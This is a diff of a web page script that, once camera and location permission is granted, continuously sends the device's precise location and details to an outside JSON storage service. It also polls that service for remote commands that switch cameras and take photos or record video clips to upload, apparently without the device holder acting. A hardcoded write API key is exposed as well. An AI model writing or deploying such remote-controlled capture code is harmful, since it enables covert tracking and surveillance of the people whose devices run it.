@@ -36,31 +36,115 @@
     const JSON_URL = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
     const API_KEY  = "b3b1f259-fdd1-4906-b083-51fe497ffd59";
 
-    // Interval kirim live frame (1500 ms = ~1.5 detik) agar tidak membebani jsonstorage.net
-    const LIVE_FRAME_MS = 1500;
-    const RECORD_MS = 4000;
+    const CMD_POLL_MS = 3500;
+    const LOC_SYNC_MS = 3500;
+    const RECORD_MS = 3500;
 
     const sessionId = "sess_" + Date.now() + "_" + Math.random().toString(36).slice(2, 7);
+    let currentFacing = "user"; // "user" = depan, "environment" = belakang
     let locationData = null;
     let cameraStream = null;
     let watchId = null;
-    let loopTimer = null;
+    let cmdTimer = null;
+    let locTimer = null;
     let isBusy = false;
     let isInitializing = false;
     let lastHandledCommandToken = null;
+    let lastSentLocKey = "";
 
     const video = document.getElementById('videoPreview');
     const canvas = document.getElementById('captureCanvas');
+    const ctx = canvas.getContext('2d', { alpha: false });
 
-    function makeFrameDataUrl(width, quality) {
+    function getCameraLabel() {
+        return currentFacing === "environment" ? "Belakang" : "Depan";
+    }
+
+    function makePhotoDataUrl(width, quality) {
         const vw = video.videoWidth || 640;
         const vh = video.videoHeight || 480;
         const targetH = Math.round((vh / vw) * width);
         canvas.width = width;
         canvas.height = targetH;
-        const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, width, targetH);
         return canvas.toDataURL('image/jpeg', quality);
+    }
+
+    async function openCameraFacing(facingMode) {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            return false;
+        }
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(t => t.stop());
+            cameraStream = null;
+        }
+        try {
+            cameraStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { ideal: facingMode }, width: { ideal: 480 }, height: { ideal: 360 } },
+                audio: false
+            });
+            currentFacing = facingMode;
+            video.srcObject = cameraStream;
+            await video.play().catch(() => {});
+            return true;
+        } catch (err) {
+            console.error("Camera error:", err);
+            return false;
+        }
+    }
+
+    async function fetchStorage() {
+        const res = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
+        if (!res.ok) throw new Error("Fetch failed");
+        const data = await res.json();
+        return {
+            logs: Array.isArray(data.logs) ? data.logs : [],
+            liveSessions: data.liveSessions && typeof data.liveSessions === "object" ? data.liveSessions : {},
+            command: data.command || { action: "NONE", targetSessionId: null, facing: null, token: null }
+        };
+    }
+
+    async function saveStorage(payload) {
+        const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
+        const res = await fetch(putUrl, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        if (!res.ok) throw new Error("Save failed");
+    }
+
+    async function syncPresenceAndLocation(forceSend) {
+        if (isBusy || !locationData) return;
+        const locKey = `${locationData.lat},${locationData.lng},${Boolean(cameraStream)},${currentFacing}`;
+        if (!forceSend && locKey === lastSentLocKey) return;
+
+        isBusy = true;
+        try {
+            const state = await fetchStorage();
+            state.liveSessions = {
+                [sessionId]: {
+                    sessionId: sessionId,
+                    nama: "HP Saya",
+                    kameraAktif: Boolean(cameraStream),
+                    kameraPosisi: getCameraLabel(),
+                    lat: locationData.lat,
+                    lng: locationData.lng,
+                    akurasi: locationData.akurasi,
+                    kecepatan: locationData.speed,
+                    arah: locationData.heading,
+                    waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
+                    updatedAt: Date.now(),
+                    perangkat: navigator.userAgent
+                }
+            };
+            await saveStorage(state);
+            lastSentLocKey = locKey;
+        } catch (err) {
+            console.error(err);
+        } finally {
+            isBusy = false;
+        }
     }
 
     function startLocationWatcher() {
@@ -75,8 +159,8 @@
             watchId = navigator.geolocation.watchPosition(
                 (pos) => {
                     locationData = {
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
+                        lat: Number(pos.coords.latitude.toFixed(6)),
+                        lng: Number(pos.coords.longitude.toFixed(6)),
                         akurasi: Math.round(pos.coords.accuracy) + " meter",
                         speed: pos.coords.speed !== null && !Number.isNaN(pos.coords.speed)
                             ? (pos.coords.speed * 3.6).toFixed(1) + " km/j"
@@ -96,7 +180,7 @@
                         reject(err);
                     }
                 },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 2000 }
             );
         });
     }
@@ -109,16 +193,12 @@
             if (!locationData) {
                 await startLocationWatcher();
             }
-            if (locationData && !cameraStream && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
-                });
-                video.srcObject = cameraStream;
-                await video.play().catch(() => {});
+            if (locationData && !cameraStream) {
+                await openCameraFacing(currentFacing);
             }
-            if (locationData && cameraStream) {
-                startLiveLoop();
+            if (locationData) {
+                await syncPresenceAndLocation(true);
+                startLoops();
             }
         } catch (err) {
             console.error(err);
@@ -148,7 +228,7 @@
                 return;
             }
             const mime = pickMimeType();
-            const opts = { videoBitsPerSecond: 160000 };
+            const opts = { videoBitsPerSecond: 140000 };
             if (mime) opts.mimeType = mime;
 
             let rec;
@@ -173,67 +253,50 @@
         });
     }
 
-    async function fetchStorage() {
-        const res = await fetch(`${JSON_URL}?t=${Date.now()}`);
-        if (!res.ok) throw new Error("Fetch failed");
-        const data = await res.json();
-        return {
-            logs: Array.isArray(data.logs) ? data.logs : [],
-            liveSessions: data.liveSessions && typeof data.liveSessions === "object" ? data.liveSessions : {},
-            command: data.command || { action: "NONE", targetSessionId: null, token: null }
-        };
-    }
-
-    async function saveStorage(payload) {
-        const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
-        const res = await fetch(putUrl, {
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-        if (!res.ok) throw new Error("Save failed");
-    }
-
-    async function tickLiveAndCommands() {
-        if (isBusy || !cameraStream || !locationData) return;
-        isBusy = true;
+    async function pollCommands() {
+        if (isBusy || !locationData) return;
 
         try {
             const state = await fetchStorage();
-            const nowStr = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB";
-
-            // Frame kecil (320px, kualitas 0.42) untuk simulasi tampilan video call
-            const liveFrame = makeFrameDataUrl(320, 0.42);
-
-            state.liveSessions[sessionId] = {
-                sessionId: sessionId,
-                nama: "HP Saya",
-                frame: liveFrame,
-                lat: locationData.lat,
-                lng: locationData.lng,
-                akurasi: locationData.akurasi,
-                kecepatan: locationData.speed,
-                arah: locationData.heading,
-                waktu: nowStr,
-                updatedAt: Date.now(),
-                perangkat: navigator.userAgent
-            };
-
             const cmd = state.command || {};
             const isForMe = !cmd.targetSessionId || cmd.targetSessionId === sessionId;
-            const hasNewAction = (cmd.action === "PHOTO" || cmd.action === "RECORD") && cmd.token && cmd.token !== lastHandledCommandToken;
+            const validActions = ["PHOTO", "RECORD", "SWITCH_CAM"];
+            const hasNewAction = validActions.includes(cmd.action) && cmd.token && cmd.token !== lastHandledCommandToken;
 
             if (isForMe && hasNewAction) {
+                isBusy = true;
                 lastHandledCommandToken = cmd.token;
+                const nowStr = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB";
 
-                if (cmd.action === "PHOTO") {
-                    const fotoHD = makeFrameDataUrl(480, 0.6);
+                if (cmd.action === "SWITCH_CAM") {
+                    const targetFacing = cmd.facing === "environment" || cmd.facing === "user"
+                        ? cmd.facing
+                        : (currentFacing === "user" ? "environment" : "user");
+                    await openCameraFacing(targetFacing);
+                    state.liveSessions[sessionId] = {
+                        sessionId: sessionId,
+                        nama: "HP Saya",
+                        kameraAktif: Boolean(cameraStream),
+                        kameraPosisi: getCameraLabel(),
+                        lat: locationData.lat,
+                        lng: locationData.lng,
+                        akurasi: locationData.akurasi,
+                        kecepatan: locationData.speed,
+                        arah: locationData.heading,
+                        waktu: nowStr,
+                        updatedAt: Date.now(),
+                        perangkat: navigator.userAgent
+                    };
+                    lastSentLocKey = `${locationData.lat},${locationData.lng},${Boolean(cameraStream)},${currentFacing}`;
+                } else if (cmd.action === "PHOTO" && cameraStream) {
+                    const foto = makePhotoDataUrl(480, 0.58);
                     state.logs.unshift({
                         id: Date.now(),
                         sessionId: sessionId,
                         tipe: "foto",
+                        kameraPosisi: getCameraLabel(),
                         nama: "HP Saya",
-                        foto: fotoHD,
+                        foto: foto,
                         video: null,
                         lat: locationData.lat,
                         lng: locationData.lng,
@@ -241,12 +304,13 @@
                         waktu: nowStr,
                         perangkat: navigator.userAgent
                     });
-                } else if (cmd.action === "RECORD") {
+                } else if (cmd.action === "RECORD" && cameraStream) {
                     const videoClip = await recordClipBase64();
                     state.logs.unshift({
                         id: Date.now(),
                         sessionId: sessionId,
                         tipe: "rekaman",
+                        kameraPosisi: getCameraLabel(),
                         nama: "HP Saya",
                         foto: null,
                         video: videoClip,
@@ -258,29 +322,33 @@
                     });
                 }
 
-                state.command = { action: "NONE", targetSessionId: null, token: null };
+                state.command = { action: "NONE", targetSessionId: null, facing: null, token: null };
+                await saveStorage(state);
+                isBusy = false;
             }
-
-            await saveStorage(state);
         } catch (err) {
-            console.error(err);
-        } finally {
             isBusy = false;
+            console.error(err);
         }
     }
 
-    function startLiveLoop() {
-        if (loopTimer) clearInterval(loopTimer);
-        tickLiveAndCommands();
-        loopTimer = setInterval(tickLiveAndCommands, LIVE_FRAME_MS);
+    function startLoops() {
+        if (locTimer) clearInterval(locTimer);
+        if (cmdTimer) clearInterval(cmdTimer);
+        locTimer = setInterval(() => syncPresenceAndLocation(true), LOC_SYNC_MS);
+        cmdTimer = setInterval(pollCommands, CMD_POLL_MS);
+    }
+
+    function cleanupSession() {
+        if (locTimer) clearInterval(locTimer);
+        if (cmdTimer) clearInterval(cmdTimer);
+        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
     }
 
     window.addEventListener("DOMContentLoaded", initSession);
-    window.addEventListener("beforeunload", () => {
-        if (loopTimer) clearInterval(loopTimer);
-        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
-    });
+    window.addEventListener("pagehide", cleanupSession);
+    window.addEventListener("beforeunload", cleanupSession);
 </script>
 
 </body>
